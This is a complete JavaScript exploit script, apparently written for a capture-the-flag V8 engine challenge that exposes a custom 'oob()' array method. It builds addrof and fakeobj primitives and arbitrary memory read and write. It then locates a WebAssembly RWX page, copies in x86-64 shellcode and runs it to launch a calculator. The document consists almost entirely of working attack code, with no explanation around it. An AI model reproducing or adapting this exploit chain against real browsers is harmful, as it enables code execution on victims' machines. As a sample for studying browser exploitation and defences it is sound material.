var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var temp_obj = {A: 1}
var temp_obj_arr = [temp_obj];
var temp_obj_arr_map = temp_obj_arr.oob();

var f_arr = [1.1, 2.2, 3.3, 4.4];
var f_arr_map = f_arr.oob();

function addrof(in_obj) {
	temp_obj_arr[0] = in_obj;
	temp_obj_arr.oob(f_arr_map);
	let addr = temp_obj_arr[0];

	temp_obj_arr.oob(temp_obj_arr_map);
	return ftoi(addr);
}

function fakeobj(addr) {
	f_arr[0] = itof(addr);
	f_arr.oob(temp_obj_arr_map);
	let fake = f_arr[0];

	f_arr.oob(f_arr_map);
	return fake;
}

var crafted_arr = [f_arr_map, 1.1, 2.2, 3.3, ftoi(5.0)]

function arb_read(addr) {
	if (addr % 2n == 0) {
		addr += 1n;
	} // pointer tagging

	var fake = fakeobj(addrof(crafted_arr) - 0x20n); // at the map

	crafted_arr[2] = itof(BigInt(addr) - 0x10n); // set elements to desired - 0x10

	return ftoi(fake[0]);
}

function initial_arb_write(addr, val) {
	if (BigInt(addr) % 2n == 0) {
		addr = BigInt(addr) + 1n;
	}

	var fake = fakeobj(addrof(crafted_arr) - 0x20n); // at the map

	crafted_arr[2] = itof(BigInt(addr) - 0x10n); // set elements to desired - 0x10

	fake[0] = itof(BigInt(val));
}

function arb_write(addr, val) {
	const arrBuffer = new ArrayBuffer(8);
	const dataView = new DataView(arrBuffer);
	const backingstore = BigInt(addrof(arrBuffer)) + 0x20n;

	initial_arb_write(backingstore, addr);
	dataView.setBigUint64(0, BigInt(val), true);
}

function copy_shellcode(addr, shellcode) {
	const copy_shellcode_buf = new ArrayBuffer(0x100);
	const dataView = new DataView(copy_shellcode_buf);
	const buf_backingstore_addr = BigInt(addrof(copy_shellcode_buf)) + 0x20n;

	initial_arb_write(buf_backingstore_addr, addr);

	for (let i = 0; i < shellcode.length; i++) {
		dataView.setUint32(4 * i, shellcode[i], true);
	}
}


const wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
const wasm_mod = new WebAssembly.Module(wasm_code);
const wasm_instance = new WebAssembly.Instance(wasm_mod);
const pop_calc = wasm_instance.exports.main;
 
const rwx_page_addr = arb_read(addrof(wasm_instance) - 1n + 0x88n);
console.log("[+] Got RWX page using WebAssembly at: 0x" + rwx_page_addr.toString(16));


console.log("[+] Copying shellcode to RWX...");
const shellcode = [0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

copy_shellcode(rwx_page_addr, shellcode);

console.log("[+] Copied shellcode!!!");
console.log("[+] Popping calc...");

pop_calc()
